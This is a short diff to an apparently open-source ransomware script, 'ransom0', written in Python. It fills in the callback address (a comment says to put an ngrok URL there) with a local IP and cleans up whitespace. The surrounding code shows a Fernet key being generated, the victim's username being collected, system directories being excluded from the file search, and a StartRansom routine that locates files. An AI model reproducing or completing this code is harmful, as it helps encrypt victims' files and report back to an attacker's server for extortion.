@@ -17,15 +17,13 @@ from random import randint
 digits = randint(1111,9999) 
 key = Fernet.generate_key()
 
-url = '' # PUT THE URL YOU GOT FROM NGROK HERE
+url = '192.168.64.3' # PUT THE URL YOU GOT FROM NGROK HERE
 
 
 
 class ransom0:
-
     username = os.getlogin()
     PATH = os.getcwd()
-
 
     EXCLUDE_DIRECTORY = (   '/usr', #Mac/Linux system directory
                             '/Library/',
@@ -111,8 +109,6 @@ ransom0 = ransom0()
 
 
 def StartRansom():
-
-
     try:
         ransom0.FindFiles()
         filepath = 'logs/path.txt'
